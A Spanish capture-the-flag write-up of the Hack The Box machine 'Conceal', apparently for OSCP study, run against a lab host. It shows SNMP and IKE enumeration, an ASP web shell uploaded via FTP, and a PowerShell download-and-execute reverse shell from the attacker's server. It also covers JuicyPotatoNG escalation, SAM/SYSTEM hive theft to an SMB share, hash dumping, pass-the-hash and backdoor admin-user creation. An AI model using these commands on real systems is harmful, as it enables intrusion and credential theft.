---
layout: post
title: Conceal
date: 2023-02-17
description:
img:
fig-caption:
tags: [OSCP, eWPT]
---
___

<center><img src="/writeups/assets/img/Conceal-htb/Conceal.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración por UDP

* Enumeración SNMP

* Enumeración ike Hosts

* Conexión a VPN interna (Ipsec)

* Subida de WebShell

* Abuso de SeImpersonatePrivilege

* PassTheHash

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.116 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 18:54 GMT
Nmap done: 1 IP address (1 host up) scanned in 27.35 seconds
```

No hay puertos abiertos por TCP :(

## Escaneo por UDP

```null
nmap -p- -sU --open --min-rate 10000 -n -Pn 10.10.10.116 -oG openportsudp
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 18:57 GMT
Nmap scan report for 10.10.10.116
Host is up (0.21s latency).
Not shown: 65533 open|filtered udp ports (no-response)
PORT    STATE SERVICE
161/udp open  snmp
500/udp open  isakmp

Nmap done: 1 IP address (1 host up) scanned in 14.50 seconds
```

### Escaneo de versión y servicios de cada puerto por UDP

```null
nmap -sV -p161,500 10.10.10.116 -sU -oN portscanudp
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 18:58 GMT
Nmap scan report for 10.10.10.116
Host is up (0.068s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)
500/udp open  isakmp  Microsoft Windows 8
Service Info: Host: Conceal; OS: Windows 8; CPE: cpe:/o:microsoft:windows:8, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.96 seconds
```

## Puerto 161 (SNMP) [UDP]

Aplico fuerza bruta para encontrar la community string

```null
onesixtyone -c /usr/share/wordlists/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.10.10.116 -w 100
Scanning 1 hosts, 121 communities
10.10.10.116 [public] Hardware: AMD64 Family 23 Model 49 Stepping 0 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
10.10.10.116 [public] Hardware: AMD64 Family 23 Model 49 Stepping 0 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
```

Recorro el SNMP y almaceno todo el output en un archivo

```null
snmpbulkwalk -v2c -c public 10.10.10.116 > snmpscan
```

Es conveniente utilizar los scripts de nmap para realizar un escaneo más potente

```null
nmap --script "snmp*" 10.10.10.116 -sU -oN snmpscan_nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 19:06 GMT
Nmap scan report for 10.10.10.116
Host is up (0.19s latency).
Not shown: 998 open|filtered udp ports (no-response)
PORT    STATE SERVICE
161/udp open  snmp
| snmp-win32-services: 
|   AppX Deployment Service (AppXSVC)
|   Application Host Helper Service
|   Background Intelligent Transfer Service
|   Background Tasks Infrastructure Service
|   Base Filtering Engine
|   CNG Key Isolation
|   COM+ Event System
|   COM+ System Application
|   Client License Service (ClipSVC)
|   Connected Devices Platform Service
|   Connected User Experiences and Telemetry
|   CoreMessaging
|   Cryptographic Services
|   DCOM Server Process Launcher
|   DHCP Client
|   DNS Client
|   Data Sharing Service
|   Data Usage
|   Device Setup Manager
|   Diagnostic Policy Service
|   Diagnostic Service Host
|   Diagnostic System Host
|   Distributed Link Tracking Client
|   Distributed Transaction Coordinator
|   Geolocation Service
|   Group Policy Client
|   IKE and AuthIP IPsec Keying Modules
|   IP Helper
|   IPsec Policy Agent
|   Local Session Manager
|   Microsoft Account Sign-in Assistant
|   Microsoft FTP Service
|   Microsoft Storage Spaces SMP
|   Network Connection Broker
|   Network List Service
|   Network Location Awareness
|   Network Store Interface Service
|   Plug and Play
|   Power
|   Print Spooler
|   Program Compatibility Assistant Service
|   RPC Endpoint Mapper
|   Remote Procedure Call (RPC)
|   SNMP Service
|   SSDP Discovery
|   Security Accounts Manager
|   Security Center
|   Server
|   Shell Hardware Detection
|   State Repository Service
|   Storage Service
|   Superfetch
|   System Event Notification Service
|   System Events Broker
|   TCP/IP NetBIOS Helper
|   Task Scheduler
|   Themes
|   Time Broker
|   TokenBroker
|   User Manager
|   User Profile Service
|   VMware Alias Manager and Ticket Service
|   VMware CAF Management Agent Service
|   VMware Physical Disk Helper Service
|   VMware Tools
|   WinHTTP Web Proxy Auto-Discovery Service
|   Windows Audio
|   Windows Audio Endpoint Builder
|   Windows Connection Manager
|   Windows Defender Antivirus Network Inspection Service
|   Windows Defender Antivirus Service
|   Windows Defender Security Centre Service
|   Windows Driver Foundation - User-mode Driver Framework
|   Windows Event Log
|   Windows Firewall
|   Windows Font Cache Service
|   Windows Management Instrumentation
|   Windows Process Activation Service
|   Windows Push Notifications System Service
|   Windows Search
|   Windows Time
|   Windows Update
|   Workstation
|_  World Wide Web Publishing Service
| snmp-brute: 
|_  public - Valid credentials
| snmp-netstat: 
|   TCP  0.0.0.0:21           0.0.0.0:0
|   TCP  0.0.0.0:80           0.0.0.0:0
|   TCP  0.0.0.0:135          0.0.0.0:0
|   TCP  0.0.0.0:445          0.0.0.0:0
|   TCP  0.0.0.0:49664        0.0.0.0:0
|   TCP  0.0.0.0:49665        0.0.0.0:0
|   TCP  0.0.0.0:49666        0.0.0.0:0
|   TCP  0.0.0.0:49667        0.0.0.0:0
|   TCP  0.0.0.0:49668        0.0.0.0:0
|   TCP  0.0.0.0:49669        0.0.0.0:0
|   TCP  0.0.0.0:49670        0.0.0.0:0
|   TCP  10.10.10.116:139     0.0.0.0:0
|   UDP  0.0.0.0:123          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:500          *:*
|   UDP  0.0.0.0:4500         *:*
|   UDP  0.0.0.0:5050         *:*
|   UDP  0.0.0.0:5353         *:*
|   UDP  0.0.0.0:5355         *:*
|   UDP  10.10.10.116:137     *:*
|   UDP  10.10.10.116:138     *:*
|   UDP  10.10.10.116:1900    *:*
|   UDP  10.10.10.116:54763   *:*
|   UDP  127.0.0.1:1900       *:*
|_  UDP  127.0.0.1:54764      *:*
| snmp-processes: 
|   1: 
|     Name: System Idle Process
|   4: 
|     Name: System
|   64: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   304: 
|     Name: smss.exe
|   396: 
|     Name: csrss.exe
|   472: 
|     Name: wininit.exe
|   480: 
|     Name: csrss.exe
|   536: 
|     Name: winlogon.exe
|   616: 
|     Name: services.exe
|   624: 
|     Name: lsass.exe
|     Path: C:\Windows\system32\
|   680: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNoNetwork
|   712: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k DcomLaunch
|   728: 
|     Name: fontdrvhost.exe
|   740: 
|     Name: fontdrvhost.exe
|   772: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceAndNoImpersonation
|   824: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k RPCSS
|   840: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalService
|   920: 
|     Name: dwm.exe
|   960: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs
|   1000: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalSystemNetworkRestricted
|   1080: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k NetworkService
|   1116: 
|     Name: vmacthlp.exe
|     Path: C:\Program Files\VMware\VMware Tools\
|   1172: 
|     Name: conhost.exe
|     Path: \??\C:\Windows\system32\
|     Params: 0x4
|   1300: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   1372: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   1388: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNetworkRestricted
|   1528: 
|     Name: spoolsv.exe
|     Path: C:\Windows\System32\
|   1664: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k appmodel
|   1740: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k apphost
|   1748: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k utcsvc
|   1756: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k ftpsvc
|   1872: 
|     Name: snmp.exe
|     Path: C:\Windows\System32\
|   1892: 
|     Name: SecurityHealthService.exe
|   1924: 
|     Name: vmtoolsd.exe
|     Path: C:\Program Files\VMware\VMware Tools\
|   1936: 
|     Name: VGAuthService.exe
|     Path: C:\Program Files\VMware\VMware Tools\VMware VGAuth\
|   1968: 
|     Name: ManagementAgentHost.exe
|     Path: C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\
|   1992: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k iissvcs
|   2024: 
|     Name: MsMpEng.exe
|   2068: 
|     Name: Memory Compression
|   2476: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k NetworkServiceNetworkRestricted
|   2644: 
|     Name: svchost.exe
|   2760: 
|     Name: msdtc.exe
|     Path: C:\Windows\System32\
|   2888: 
|     Name: WmiPrvSE.exe
|     Path: C:\Windows\system32\wbem\
|   2992: 
|     Name: dllhost.exe
|     Path: C:\Windows\system32\
|     Params: /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
|   3128: 
|     Name: LogonUI.exe
|     Params:  /flags:0x0 /state0:0xa39c8855 /state1:0x41c64e6d
|   3216: 
|     Name: MpCmdRun.exe
|     Path: C:\Program Files\Windows Defender\
|     Params:  -IdleTask -TaskName WdCacheMaintenance
|   3236: 
|     Name: SearchIndexer.exe
|     Path: C:\Windows\system32\
|     Params: /Embedding
|   3316: 
|     Name: NisSrv.exe
|   3344: 
|     Name: WmiPrvSE.exe
|     Path: C:\Windows\system32\wbem\
|   3564: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k smphost
|   3976: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalSystemNetworkRestricted
|   4788: 
|     Name: SearchFilterHost.exe
|     Path: C:\Windows\system32\
|     Params:  0 692 696 704 8192 700 
|   4816: 
|     Name: SearchProtocolHost.exe
|     Path: C:\Windows\system32\
|_    Params:  Global\UsGthrFltPipeMssGthrPipe1_ Global\UsGthrCtrlFltPipeMssGthrPipe1 1 -2147483646 "Software\Microsoft\Windows Search" "Mozil
| snmp-sysdescr: Hardware: AMD64 Family 23 Model 49 Stepping 0 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
|_  System uptime: 17m2.68s (102268 timeticks)
| snmp-win32-users: 
|   Administrator
|   DefaultAccount
|   Destitute
|_  Guest
| snmp-interfaces: 
|   Software Loopback Interface 1\x00
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 1 Gbps
|     Status: up
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (IKEv2)\x00
|     Type: tunnel  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (PPTP)\x00
|     Type: tunnel  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Microsoft Kernel Debug Network Adapter\x00
|     Type: ethernetCsmacd  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (L2TP)\x00
|     Type: tunnel  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Teredo Tunneling Pseudo-Interface\x00
|     MAC address: Unknown
|     Type: tunnel  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (IP)\x00
|     Type: ethernetCsmacd  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (SSTP)\x00
|     Type: tunnel  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (IPv6)\x00
|     Type: ethernetCsmacd  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (PPPOE)\x00
|     Type: ppp  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (Network Monitor)\x00
|     Type: ethernetCsmacd  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   vmxnet3 Ethernet Adapter\x00
|     IP address: 10.10.10.116  Netmask: 255.255.255.0
|     MAC address: 005056b96d89 (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|     Traffic stats: 175.26 Kb sent, 22.46 Mb received
|   vmxnet3 Ethernet Adapter-WFP Native MAC Layer LightWeight Filter-0000\x00
|     MAC address: 005056b96d89 (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|     Traffic stats: 175.26 Kb sent, 22.46 Mb received
|   vmxnet3 Ethernet Adapter-QoS Packet Scheduler-0000\x00
|     MAC address: 005056b96d89 (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|     Traffic stats: 175.26 Kb sent, 22.46 Mb received
|   vmxnet3 Ethernet Adapter-WFP 802.3 MAC Layer LightWeight Filter-0000\x00
|     MAC address: 005056b96d89 (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|_    Traffic stats: 175.26 Kb sent, 22.46 Mb received
| snmp-win32-software: 
|   Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161; 2021-03-17T15:16:36
|   Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161; 2021-03-17T15:16:36
|_  VMware Tools; 2021-03-17T15:16:36
```

Ha encontrado las interfaces de red, usuarios del sistema, puertos internos abiertos, servicios y procesos. También la dirección MAC y puedo computar la Link Local Address, pero para abusar de esta es necesario comprometer otra máquina del entorno para aplicar pivoting

Al abrir la captura del ```snmpbulkwalk``` se puede ver en las primeras líneas que referencian a una VPN (No la de HTB, otra interna)

```null
SNMPv2-MIB::sysContact.0 = STRING: IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
```

Corresponde a un hash, que en caso de que la contraseña esté en un diccionario se puede crackear

<img src="/writeups/assets/img/Conceal-htb/2.png" alt="">

Está relacionado con el Puerto 500. En [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting) hay documentación al respecto

<img src="/writeups/assets/img/Conceal-htb/1.png" alt="">

Lo primero es encontrar la transformación

```null
ike-scan -M --showbackoff 10.10.10.116
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.10.116	Main Mode Handshake returned
	HDR=(CKY-R=9cc5eaa06dea7192)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)
	VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)
	VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)
	VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\n)
	VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)
	VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)
	VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)

IKE Backoff Patterns:

IP Address	No.	Recv time		Delta Time
10.10.10.116	1	1676662307.182801	0.000000
10.10.10.116	Implementation guess: Linksys Etherfast

Ending ike-scan 1.9.5: 1 hosts scanned in 60.136 seconds (0.02 hosts/sec).  1 returned handshake; 0 returned notify
```

De aquí puedo sacar que se está utilizando SHA1 como tipo de hash, la autenticación es PSK y el IKE de versión 1

Para conectarme a la VPN voy a utilizar strogswan. En este [artículo](https://manpages.ubuntu.com/manpages/focal/en/man5/ipsec.secrets.5.html) explican como configurar el archvio ```/etc/ipsec.secrets```, correspondiente a las credenciales de la VPN

```null
cat /etc/ipsec.secrets
%any : PSK "Dudecake1!"
```

Falta editar el archivo de configuración, siguiendo esta [guía](https://www.systutorials.com/docs/linux/man/5-ipsec.conf/)

```null
cat /etc/ipsec.conf
config setup

conn conceal
  keyexchange=ikev1
  type=transport
  left=10.10.16.4
  right=10.10.10.116
  auto=add
  authby=secret
  ike=3des-sha1-modp1024
  esp=3des-sha1
```

```null
ipsec up conceal
initiating Main Mode IKE_SA conceal[1] to 10.10.10.116
generating ID_PROT request 0 [ SA V V V V V ]
sending packet: from 10.10.16.4[500] to 10.10.10.116[500] (236 bytes)
received packet: from 10.10.10.116[500] to 10.10.16.4[500] (208 bytes)
parsed ID_PROT response 0 [ SA V V V V V V ]
received MS NT5 ISAKMPOAKLEY vendor ID
received NAT-T (RFC 3947) vendor ID
received draft-ietf-ipsec-nat-t-ike-02\n vendor ID
received FRAGMENTATION vendor ID
received unknown vendor ID: fb:1d:e3:cd:f3:41:b7:ea:16:b7:e5:be:08:55:f1:20
received unknown vendor ID: e3:a5:96:6a:76:37:9f:e7:07:22:82:31:e5:ce:86:52
selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024
generating ID_PROT request 0 [ KE No NAT-D NAT-D ]
sending packet: from 10.10.16.4[500] to 10.10.10.116[500] (244 bytes)
received packet: from 10.10.10.116[500] to 10.10.16.4[500] (260 bytes)
parsed ID_PROT response 0 [ KE No NAT-D NAT-D ]
generating ID_PROT request 0 [ ID HASH N(INITIAL_CONTACT) ]
sending packet: from 10.10.16.4[500] to 10.10.10.116[500] (100 bytes)
received packet: from 10.10.10.116[500] to 10.10.16.4[500] (68 bytes)
parsed ID_PROT response 0 [ ID HASH ]
IKE_SA conceal[1] established between 10.10.16.4[10.10.16.4]...10.10.10.116[10.10.10.116]
scheduling reauthentication in 10105s
maximum IKE_SA lifetime 10645s
generating QUICK_MODE request 2953621072 [ HASH SA No ID ID ]
sending packet: from 10.10.16.4[500] to 10.10.10.116[500] (220 bytes)
received packet: from 10.10.10.116[500] to 10.10.16.4[500] (188 bytes)
parsed QUICK_MODE response 2953621072 [ HASH SA No ID ID ]
selected proposal: ESP:3DES_CBC/HMAC_SHA1_96/NO_EXT_SEQ
CHILD_SA conceal{1} established with SPIs c156446b_i 06c58e10_o and TS 10.10.16.4/32 === 10.10.10.116/32[tcp]
generating QUICK_MODE request 2953621072 [ HASH ]
connection 'conceal' established successfully
```

En caso de un fallo de conexión, lo más probable es que no esten instalados todos los plugins necesarios. Para solucionarlo, hay que ejecutar lo siguiente

```null
for i in $(apt search strongswan | grep kali | awk '{print $1}' FS="/"); do apt install $i -y; done
```

Ahora al escanear los puertos por TCP pasando por la VPN, si que encuentra abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sT 10.10.10.116 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 21:05 GMT
Nmap scan report for 10.10.10.116
Host is up (0.041s latency).
Not shown: 46983 filtered tcp ports (no-response), 18543 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 23.09 seconds
```

Lanzo los scripts básicos de reconocimiento

```null
nmap -sCV -p21,80,135,139,445,49665,49666,49667,49669 -sT 10.10.10.116 -oN porstcan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 21:06 GMT
Nmap scan report for 10.10.10.116
Host is up (0.100s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-17T21:07:32
|_  start_date: 2023-02-17T18:51:12

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.69 seconds
```

Hay que destacar que no es que esté empleando ningún proxy por detrás, si no que se me ha asignado una nueva interfaz al equipo

```null
5: br-b30f09838a3e: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:21:e4:4a:d5 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-b30f09838a3e
       valid_lft forever preferred_lft forever
```

## Puerto 21 (FTP)

Me puedo conectar haciendo uso de un null session, pero no hay nada que listar

```null
ftp 10.10.10.116
Connected to 10.10.10.116.
220 Microsoft FTP Service
Name (10.10.10.116:rubbx): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49674|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
```

## Puerto 135 (RPC)

No tengo acceso

```null
rpcclient 10.10.10.116 -U "" -N
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

## Puerto 445 (SMB)

Con crackmapexec, aplico un escaneo para ver dominio, hostname y versiones

```null
crackmapexec smb 10.10.10.116
SMB         10.10.10.116    445    CONCEAL          [*] Windows 10.0 Build 15063 x64 (name:CONCEAL) (domain:Conceal) (signing:False) (SMBv1:False)
```

No puedo listar los recursos compartidos

```null
smbmap -H 10.10.10.116 -u 'null'
[!] Authentication error on 10.10.10.116
```

## Puerto 80 (HTTP)

Con whatweb analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.116
http://10.10.10.116 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.116], Microsoft-IIS[10.0], Title[IIS Windows]
```

La página principal se ve así:

<img src="/writeups/assets/img/Conceal-htb/3.png" alt="">

Aplico fuzzing para descubrir rutas

```null
gobuster dir -u http://10.10.10.116/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 140
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.116/
[+] Method:                  GET
[+] Threads:                 140
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/17 21:20:22 Starting gobuster in directory enumeration mode
===============================================================
/upload               (Status: 301) [Size: 150] [--> http://10.10.10.116/upload/]
```

El directorio ```upload``` tiene capacidad de Directory Listing

<img src="/writeups/assets/img/Conceal-htb/4.png" alt="">

Está sincronizado con el FTP, por lo que puedo subir una web shell en ASPX para ganar acceso al sistema

Creo un archivo que permita ejecutar comandos a nivel de sistema, utilizando el oneliner de [HackingDream](https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html)

```null
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
```

```null
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
229 Entering Extended Passive Mode (|||49681|)
125 Data connection already open; Transfer starting.
100% |*******************************************************************************************************************************************************************|   400        2.27 MiB/s    00:00 ETA
226 Transfer complete.
```

Al intentar cargarlo, me aparece un error:

<img src="/writeups/assets/img/Conceal-htb/5.png" alt="">

Lo que hago es cambiar la extensión de ASPX a ASP

```null
curl -s -X GET '10.10.10.116/upload/shell.asp?cmd=whoami'
conceal\destitute
```

Gano acceso al sistema utilizando ```Invoke-PowerShellTcp.ps1``` de nishang

```null
echo 'IEX(New-Object Net.WebClient).downloadString("http://10.10.16.4/Invoke-PowerShellTcp.ps1")' | iconv -t utf-16le | base64 -w 0 | xclip -sel clip
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.116] 49690
Windows PowerShell running as user CONCEAL$ on CONCEAL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\SysWOW64\inetsrv>whoami
conceal\destitute
PS C:\Windows\SysWOW64\inetsrv> 
```

Puedo visualizar la primera flag

```null
PS C:\Users\Destitute\Desktop> type user.txt
4186905dddae28b8cfdb898b30db5f3f
```

# Escalada

En la raíz hay un directorio con un script en powershell, pero no se puede abusar de este. Corresponde a la tarea que borra los scripts en el directorio ```uploads```

```null
PS C:\admin_checks> type checks.ps1
# run standard checks
Get-ChildItem -Path C:\inetpub\wwwroot\upload\* -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

# run one time checks
foreach($check in (Get-ChildItem C:\admin_checks\checks\*.ps1 -File)){
    . $check.fullname
    $check | Remove-Item -Force -ErrorAction SilentlyContinue
}
```

Tengo el ```SeImpersonatePrivileage```, por lo que la escalada está asegurada

```null
PS C:\admin_checks> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

Subo el ```JuicyPotatoNG.exe``` a la máquina y lo ejecuto. Creo un recurso compartido a nivel de red para copiarme la SAM y el SYSTEM a mi equipo

```null
impacket-smbserver shared $(pwd) -smb2support
```

```null
PS C:\Temp> .\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c reg save HKLM\SAM \\10.10.16.4\shared\sam"


	JuicyPotatoNG
	by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
[-] CreateProcessAsUser Failed to create proc: 2
[+] CreateProcessWithTokenW OK
[+] Exploit successful! 
PS C:\Temp> .\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c reg save HKLM\SYSTEM \\10.10.16.4\shared\system"


	JuicyPotatoNG
	by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
[-] CreateProcessAsUser Failed to create proc: 2
[+] CreateProcessWithTokenW OK
[+] Exploit successful! 
```

Con ```impacket-secretsdump``` dumpeo los hashes NT de todos los usuarios

```null
impacket-secretsdump -system system -sam sam LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xc03291f1e2546394e520465648694c79
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cfae93e238dd61819cb9ab492a31cf06:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Destitute:1001:aad3b435b51404eeaad3b435b51404ee:213d5b0f252d57b6ede6b74ba7ba04b2:::
[*] Cleaning up... 
```

Hago PassTheHash para conectarme como Administrador y veo la segunda flag

```null
psexec.py WORKGROUP/Administrator@10.10.10.116 -hashes :cfae93e238dd61819cb9ab492a31cf06
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.116.....
[*] Found writable share ADMIN$
[*] Uploading file oqnjoUOO.exe
[*] Opening SVCManager on 10.10.10.116.....
[*] Creating service rLgA on 10.10.10.116.....
[*] Starting service rLgA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.15063]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
bbc8a4e6ba2d7720d1446defba5d9168
```

Otra forma de ganar acceso sería creando un usuario y agregándolo al grupo Administrators

```null
PS C:\Temp> .\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c net user rubbx rubbx123$! /add"
PS C:\Temp> .\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c net localgroup Administrators rubbx /add"
```

Pero al intentar conectarme por ```psexec``` no tengo permisos

```null
psexec.py 'WORKGROUP/rubbx:rubbx123$!@10.10.10.116'
